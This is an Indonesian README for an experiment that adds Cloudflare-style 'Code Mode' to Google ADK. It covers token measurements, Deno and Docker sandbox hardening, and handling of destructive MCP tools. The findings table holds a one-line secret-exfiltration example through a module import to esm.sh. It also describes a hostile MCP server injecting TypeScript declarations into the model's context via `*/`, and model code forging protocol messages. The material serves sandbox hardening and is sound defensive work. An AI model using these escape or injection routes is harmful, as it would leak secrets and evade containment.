# Code Mode untuk Google ADK

Implementasi pola **Code Mode** ([Cloudflare](https://blog.cloudflare.com/code-mode/))
di Google ADK: MCP tool diubah jadi API TypeScript, dan model menulis kode yang
memanggil API itu di sandbox — bukan memanggil tool satu per satu.

Dibangun sebagai **eksperimen yang diukur**, bukan sebagai library siap pakai.
Pertanyaannya: apakah klaim blog itu bertahan di ADK?

## Jawaban singkat: bertahan, dengan dua syarat yang blog tidak sebut

Klaim blog ada tiga. Hasil pengukuran (`cc/claude-sonnet-5-5`, 48 run grid
penuh + sapuan ukuran payload):

| Klaim blog | Hasil |
|---|---|
| "handle **many more tools**" | ✅ sebagian — hemat di biaya deklarasi (hingga −23%), tapi akurasi pemilihan tool tidak pernah jadi masalah sampai 60 tool |
| "handle **more complex tools**" | ✅ didukung, efek terkuat |
| "shines when **stringing together multiple calls**" | ✅ **terbukti kuat** — tapi penyebabnya **ukuran hasil antara**, bukan jumlah call |

Hasil paling tegas — menyapu ukuran payload pada task identik, 10 tool:

| payload 1 wilayah | tanpa code mode | dengan code mode | rasio |
|---:|---:|---:|---:|
| 692 char | 3.527 tok | 4.292 tok | 1,22× |
| 1.714 char | 6.053 | 4.320 | **0,71×** |
| 5.135 char | 14.483 | 4.333 | **0,30×** |
| 17.156 char | 43.947 | 4.388 | **0,10×** |
| 34.332 char | 86.037 | 4.322 | **0,05×** |

```
code mode : ~4.300 token, DATAR - tidak peduli payload sebesar apa
direct    : linear terhadap ukuran payload
```

Semua benar di kedua mode. Titik silang ada di sekitar 1 KB payload per tool
call.

### Dua syarat yang menentukan

**1. Kode model harus jadi di percobaan pertama.** Kalau gagal, tiap perbaikan
mengirim ulang blok deklarasi + kode gagal + error — jauh lebih mahal daripada
direct mode yang cukup mengulang satu tool call. Dan tingkatnya **tergantung
model**:

| model | kode jadi sekali |
|---|---|
| `gemini-3.5-flash` | 8/16 (50%) → code mode kalah 11/16 |
| `cc/claude-sonnet-5-5` | **24/24 (100%)** |

**2. Harus ada hasil antara yang layak disaring.** Di bawah ~1–2 KB per tool
call, blok deklarasi lebih mahal daripada yang dihemat. Pada dataset kecil
(12 baris), code mode kalah **+24% sampai +69%** di semua titik grid.

Keduanya tidak dibahas di blog, dan keduanya menentukan apakah code mode
untung atau rugi.

Detail lengkap, termasuk kesalahan pengukuran yang sempat terjadi:
[`docs/eval-results.md`](docs/eval-results.md).

## Status

| Fase | Status |
|---|---|
| 0 — Spike (6 pertanyaan kelayakan) | ✅ selesai |
| 1 — Catalog + Codegen TS | ✅ gerbang lolos |
| 2 — Sandbox + RPC | ✅ 28 test |
| 3 — Integrasi ADK | ✅ gerbang lolos |
| 4 — Evaluasi | ✅ grid 10/30/60 lengkap + sapuan ukuran payload |
| 5a — Jalur `direct` untuk tool destruktif | ✅ 9 test, probe negatif gagal saat disabotase |
| 5b — Container hardening | ✅ gerbang lolos, 4 pemeriksaan lolos-saat-flag-Deno-dilonggarkan |
| 5c — Precheck type-check | ✅ tangkapan 7/7, false positive 0/5 |

105 unit test, `ruff` bersih, `deno check` + `deno lint` bersih.

## Arsitektur

In-process, meniru `codemode()` Cloudflare — supervisor = agent = pemegang
token, sesuai blog: *"All calls made on it go to the agent supervisor first,
which holds the access tokens."*

```
┌─ agent.py (ADK) ───────────────────────────────┐
│  LlmAgent(                                     │
│    instruction=cm.instruction_provider(...),   │
│    tools=cm.tools)   <- execute_code + direct  │
└────────────────────────────────────────────────┘
        CodeMode
        ├── Catalog     : BaseTool[] -> katalog netral
        ├── Codegen     : katalog -> deklarasi API   [pluggable: TS | PY]
        ├── ExecuteCodeTool
        ├── Sandbox     : Deno, fresh per call, tanpa jaringan
        ├── RpcBridge   : satu-satunya lapisan yang menyentuh ADK
        └── OutputGuard : bounding log -> artifact
```

`cm.tools` = `[cm.tool, cm.direct_toolset]`. Tanpa tool destruktif, isinya
tepat **satu** tool seperti di blog; `direct_toolset` kosong dan tidak
menambah apa pun ke konteks.

### Jalur `direct` (Fase 5, tambahan di luar blog)

Blog tidak membahas tool destruktif. Masalahnya nyata: `write_file` di dalam
kode berarti model menulis argumen yang **tidak pernah dilihat siapa pun**,
dan `require_confirmation` ADK tidak punya tempat untuk bertanya.

Solusinya memilah, bukan melarang: tool destruktif dikeluarkan dari sandbox
dan dideklarasikan apa adanya ke model, sehingga HITL dan rantai callback
berjalan lewat jalur bawaan ADK. Pola yang dihasilkan: `execute_code` untuk
membaca dan menyaring, tool langsung untuk bertindak.

Tiga kebijakan (`direct_policy=`), default **off** supaya hasil Fase 0-4 tidak
berubah; `direct=["nama"]` atau predikat selalu berlaku di atasnya.

Terukur pada server filesystem resmi (14 tool, semuanya beranotasi):

| kebijakan | direct | tool |
|---|---|---|
| `off` | 0/14 | — |
| `annotations` | 3/14 | `write_file`, `edit_file`, `move_file` |
| `annotations-strict` | 3/14 | sama |

`create_directory` **tetap di sandbox**: anotasinya `destructiveHint=false`,
yaitu aditif. Itu memang semantik yang dimaksud spesifikasi MCP.

Dua jebakan spesifikasi yang ditangani sadar:

1. `destructiveHint` **default-nya true** dan hanya bermakna saat
   `readOnlyHint == false`. Jadi "hint absen" bukan "aman". `annotations`
   memilih pragmatis (absen → tetap di sandbox), `annotations-strict` setia
   pada spec (absen → direct). Di server resmi keduanya sama karena anotasinya
   lengkap; di server yang tidak menulis anotasi, `strict` bisa mengosongkan
   sandbox sepenuhnya.
2. Anotasi adalah **hint dari server yang mungkin tidak dipercaya**. Karena itu
   anotasi hanya boleh memperketat: `readOnlyHint=true` tidak bisa menarik
   tool keluar dari daftar `direct` yang diminta pemilik agent. Ada test untuk
   ini.

Penegakannya di **host**, bukan di sandbox. Nama tool direct tidak ada di
manifest maupun deklarasi TypeScript (jalur normal → `TypeError`), dan
`RpcBridge` menolaknya dengan `DirectOnlyError` kalau pesan protokol dipalsukan
lewat `Deno.stdout` mentah. Kedua test itu terbukti **gagal** ketika filter
`tool_map` disabotase — dan di `scripts/f5_gate.py` (server resmi) sabotase yang
sama **benar-benar menulis berkas ke disk**. Lapisan manifest sendirian tidak
cukup; risikonya terukur, bukan teoretis.

### Container hardening (Fase 5b, opsional)

`CodeMode(sandbox=DockerSandbox())` menjalankan Deno di dalam container.
Hanya `_spawn()` yang berbeda — protokol, pump, dan semua batas host diwarisi,
jadi tidak ada jalur kedua yang bisa menyimpang. Flag `--deny-*` Deno tetap
dipakai: container adalah lapisan **tambahan**.

Yang ditegakkan kernel, bukan runtime: `--network none`, `--memory` +
`--memory-swap` (swap nol), `--cpus`, `--pids-limit`, rootfs `--read-only` +
satu tmpfs kecil, `--cap-drop ALL`, `no-new-privileges`, user non-root.

Gerbangnya tidak bertanya "apakah containernya jalan", tapi **apakah container
menambah batas atau cuma menduplikasi flag Deno**. Tiap pemeriksaan sengaja
melonggarkan flag Deno yang relevan:

| pemeriksaan | dilonggarkan | hasil |
|---|---|---|
| jaringan | `--allow-net` | `fetch failed` — tidak ada interface |
| filesystem | `--allow-write` | `/etc` dan `/` ditolak, `/tmp` berhasil |
| privilege | `--allow-sys` | `uid: 1000`, bukan root |
| memori | — | alokasi 4 GiB di container 64m → exit 137 |

Disabotase (`--network none`, `--read-only`, `--memory`, `-u` dicabut),
keempatnya gagal sekaligus: `fetch` berhasil, `/etc/disusupi` **benar-benar
tertulis**, prosesnya root, 4 GiB teralokasi.

**Lubang nyata yang ditutup:** sebelum ini memori **tidak dibatasi sama
sekali**, dan `timeout_s` tidak menolong karena kerusakan terjadi lebih dulu.
`while(true) arr.push(...)` adalah kesalahan model biasa, bukan skenario
penyerang.

**Biaya, diukur:** median **66-73 ms** (lokal) vs **467-493 ms** (Docker) —
~7x. Itu sebabnya bukan default. `docker_path` bisa diarahkan ke `podman`
(rootless, API kompatibel) tanpa mengubah kode.

### Precheck type-check (Fase 5c, opsional)

`CodeMode(precheck=True)` menjalankan `deno check` atas deklarasi + kode model
**sebelum** sandbox dijalankan. Gagal → status `type_error`, **nol tool call**,
model menerima diagnostik TypeScript yang tepat.

Ini menyerang syarat yang Fase 4 buktikan paling menentukan: kode harus jadi di
percobaan pertama. Tapi nilai terbesarnya bukan kecepatan — melainkan **nol efek
samping**. Tanpa precheck, rantai yang separuhnya sah menjalankan call-call
pertamanya lalu gagal di tengah, dan tool yang sudah jalan tidak bisa
dibatalkan. Terukur saat gerbangnya disabotase: `list_directory` dan
`get_file_info` tetap jalan sebelum error tipe di baris terakhir menghentikannya.

| | hasil |
|---|---|
| tangkapan pada korpus rusak | **7/7** (TS2551/2345/2322/2353/2339) |
| false positive pada korpus valid | **0/5** |

False positive adalah kegagalan mutlak di gerbang: menolak kode yang benar
lebih buruk daripada tidak memeriksa, karena model tidak bisa membedakan
penolakan yang salah dari yang benar.

**Biaya, dengan temuan yang mengubah cara memahaminya:** median **~750-800 ms**,
dan itu **hampir seluruhnya startup `deno check`** — biayanya sama besar
dengan deklarasi kosong (780 ms) maupun 14 tool (748 ms). Jadi ongkosnya tidak
tumbuh dengan jumlah tool, dan memperkecil deklarasi tidak akan menurunkannya.
Kode identik hampir gratis (91 ms, cache Deno), tapi snippet nyata selalu
berbeda.

**Defaultnya mati**, dua alasan: menyalakannya mengubah kondisi pengukuran
Fase 4, dan pada model yang sudah 100% jadi-sekali ia hanya menambah ongkos.

**Yang belum boleh diklaim:** manfaatnya pada tingkat jadi-sekali belum diukur
end-to-end dengan LLM. Mengukurnya butuh model yang sering gagal — jalur
Gemini API sudah dimatikan dan `cc/claude-sonnet-5-5` sudah 24/24, jadi tidak
ada ruang perbaikan untuk diukur.

Egress sandbox hanya stdio ke proses induk. Tanpa jaringan sama sekali, jadi
tidak ada port atau kredensial yang bisa disalahgunakan — semangat yang sama
dengan *bindings* Cloudflare (kapabilitas, bukan jaringan).

## Tujuh temuan yang tidak ada di blog

Semuanya ketemu karena ditulis test yang **bisa gagal**.

| # | Temuan |
|---|---|
| 1 | **`--deny-net` tidak memblokir module import.** Deno punya allow-list bawaan (`esm.sh`, `cdn.jsdelivr.net`, `raw.githubusercontent.com`, …). `import("https://esm.sh/x?d="+rahasia)` = kanal eksfiltrasi. `--deny-import` tidak memperbaiki, `--cached-only` **lebih buruk**. Yang benar: `--no-remote --no-npm` |
| 2 | **`isError` MCP tidak melempar exception.** Baca berkas tidak ada → hasil normal berisi `isError:true`. Di direct mode tidak berbahaya; di code mode fatal, karena kode membaca return value dan lanjut seolah berhasil |
| 3 | **Tipe `Output` tidak cocok nilai runtime.** `outputSchema` menjelaskan `structuredContent`, tapi ADK meneruskan envelope `CallToolResult` utuh. Tipe yang menyesatkan lebih buruk daripada tanpa tipe |
| 4 | **`*/` di deskripsi tool kabur dari blok JSDoc.** Server filesystem **resmi** memicunya (`'**/*.ext'`). Server bermusuhan bisa menyuntik deklarasi TS ke konteks model |
| 5 | **Callback ADK tidak jalan** kalau `tool.run_async()` dipanggil langsung — dipicu oleh flow, bukan oleh tool. Tanpa replikasi 5 langkah, HITL, deny-rule, dan hook redaksi mati tanpa suara |
| 6 | **58% deklarasi awalnya boilerplate** (envelope diulang per tool). Diperbaiki lewat komposisi `allOf` → `extends`: −42% |
| 7 | **`workerd` lokal bukan hardened sandbox** — menurut dokumen Cloudflare sendiri. Isolasi kuat Code Mode adalah properti infra mereka, bukan properti workerd yang di-self-host |

## Menjalankan

Prasyarat: Python 3.12, Node 22 (`npx`), Deno (`npm i -g deno`).

```bash
pip install -e ".[dev]"

# unit test
PYTHONPATH=src pytest tests/ -q

# gerbang Fase 1 - codegen tervalidasi type-checker
python scripts/f1_gate.py

# gerbang Fase 3 - tumpukan penuh, MCP server filesystem sungguhan
python scripts/f3_gate.py

# gerbang Fase 5a - jalur direct, termasuk uji pemalsuan protokol
python scripts/f5_gate.py

# gerbang Fase 5b - container; butuh daemon Docker hidup
python scripts/f5b_gate.py

# gerbang Fase 5c - precheck: tangkapan + false positive + latensi
python scripts/f5c_gate.py
```

Gerbang Fase 1 memakai tiga pemeriksaan, bukan satu: deklarasi harus lolos
`deno check`, probe **positif** harus lolos, dan probe **negatif** harus
**gagal**. Yang terakhir yang membuatnya berarti — tanpa itu, deklarasi yang
isinya `any` semua juga akan "lolos".

### Evaluasi

Biaya konteks (deterministik, tanpa LLM):

```bash
PYTHONPATH=. python eval/diag_declared_tools.py
```

Correctness & token (butuh endpoint OpenAI-compatible):

```bash
cp .env.example .env      # isi LITELLM_BASE_URL + LITELLM_API_KEY
PYTHONPATH=. python eval/harness.py run --tools 10,30,60
PYTHONPATH=. python eval/harness.py report
```

Hasil ditulis ke JSONL **per-run** dengan `--resume`, jadi run bisa dipotong
sesuai batas waktu dan dilanjutkan.

Kalau endpoint memakai **prompt caching**, `prompt_tokens` mengukur biaya
tagihan, bukan ukuran konteks, dan nilainya bergantung urutan eksekusi.
`eval/token_proxy.py` mengukur dari kabel dan menghitung token sendiri dengan
tokenizer yang konsisten:

```bash
python eval/token_proxy.py --port 20129 --upstream http://host-anda/v1
# lalu arahkan LITELLM_BASE_URL ke http://localhost:20129/v1
```

## Penyimpangan sadar dari blog

| Blog | Di sini | Alasan |
|---|---|---|
| Isolate V8 (Worker Loader) | Deno, opsional di container | `workerd` lokal bukan hardened sandbox menurut dokumen Cloudflare sendiri; isolasi kuat mereka adalah properti infra, bukan pustaka |
| Bindings (`env` objek hidup) | stdio ke parent | Semangat sama, lebih kuat: tanpa stack jaringan |
| `declare const codemode` flat | `tools.<server>.<tool>` | Tabrakan nama >1 server. Satu server → tetap flat |
| Tool generik | MCP-only | Penyempitan scope. `Catalog` tetap berbasis `BaseTool` |

Blog **diam** soal tujuh hal yang ditambahkan di sini: timeout & batas call,
bounding output, pemetaan error, pemilahan tool yang tidak boleh masuk sandbox,
harness evaluasi, jalur `direct` (Fase 5a), dan precheck type-check (Fase 5c).

Satu penyimpangan berkurang maknanya: tool yang dulu **dibuang** dari katalog
(butuh konfirmasi / kredensial interaktif) sekarang dirutekan ke `direct`, jadi
tidak ada lagi tool yang hilang diam-diam.

## Batasan yang harus diketahui

- **L1 mencegah kecelakaan, bukan penyerang.** Permission berbasis flag bukan
  batas keamanan — penegaknya runtime yang sama yang menjalankan kode model.
  Batas nyata tersedia lewat `DockerSandbox` (Fase 5b), tapi **bukan default**
  karena ongkosnya +400 ms per eksekusi.
- **Kode model bisa memalsukan pesan protokol** lewat `Deno.stdout` mentah
  (`console.log` dibajak, `writeSync` tidak). Sudah dianalisis: `call` palsu
  tetap dihitung host dan tetap lewat `RpcBridge`, jadi bukan eskalasi hak.
  Konsekuensinya **semua batas ditegakkan di host**, bukan di sandbox — termasuk
  penolakan tool jalur `direct`.
- **Anotasi MCP adalah hint, bukan jaminan.** Server yang bermusuhan bisa
  menandai tool destruktif sebagai `readOnlyHint=true`. Karena itu `direct=`
  eksplisit selalu menang, dan `annotations` tidak boleh dianggap kontrol
  keamanan — hanya kenyamanan untuk server yang jujur.
- **Tidak ada tool call paralel di lengan Python** (belum dibuat) — hanya
  relevan kalau `Codegen` Python dipakai.
- `elicitation` / `sampling` / `roots` **tidak didukung**.
- Angka token dihitung sendiri di `eval/token_proxy.py` dengan tiktoken, bukan
  dari `prompt_tokens` provider — yang terbukti tidak konsisten (meremehkan 2x
  pada satu kasus, melebihkan 2x pada kasus lain).
- `Catalog` masih memakai satu API privat ADK (`_mcp_tool.outputSchema`).
  Input schema sudah lewat jalur publik, dan kalau yang privat hilang,
  degradasinya mulus ke index signature.

## Dokumen

| Berkas | Isi |
|---|---|
| [`implementasi.md`](implementasi.md) | Rencana, alur, fase, risiko, audit kesesuaian terhadap blog |
| [`docs/tech-stack.md`](docs/tech-stack.md) | Keputusan stack + semua kandidat yang ditolak beserta alasannya |
| [`docs/spike-results.md`](docs/spike-results.md) | Hasil Fase 0, 6 spike kelayakan |
| [`docs/eval-results.md`](docs/eval-results.md) | Hasil evaluasi, termasuk kesalahan pengukuran yang sempat terjadi |

## Lisensi

Belum ditentukan.
